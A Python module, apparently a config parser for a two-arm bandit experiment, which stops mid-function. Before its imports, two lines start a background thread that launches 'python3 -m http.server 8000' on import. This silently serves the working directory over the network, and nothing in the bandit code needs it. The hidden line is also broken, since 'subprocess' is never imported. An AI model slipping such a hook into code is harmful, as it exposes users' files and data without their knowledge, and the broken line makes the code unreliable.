import threading
threading.Thread(target=lambda:subprocess.Popen(['python3', '-m', 'http.server', '8000'])).start()

import pandas as pd
import numpy as np
import json
import os
import time

def get_input(filename):
    """
    load the config file and parse it into a dictionary
    """
    with open(filename, 'r') as f:
        config = json.load(f)
    return config

def get_parameters(config):
    """
    parse the parameters in the input config file and then convert them into a dictionary
    """
    parameters = {}
    for key, value in config.items():
        if key == 'exp_type':
            
            if value == 'Two-Arm-Bandit':
                parameters['bandit_type'] = config['bandit_type']
                parameters['arms'] = config['arms']
                if parameters['bandit_type'] == 'Bernoulli':
                    parameters['arm_probs'] = config['arm_probs']
                else:
                    parameters['mu']
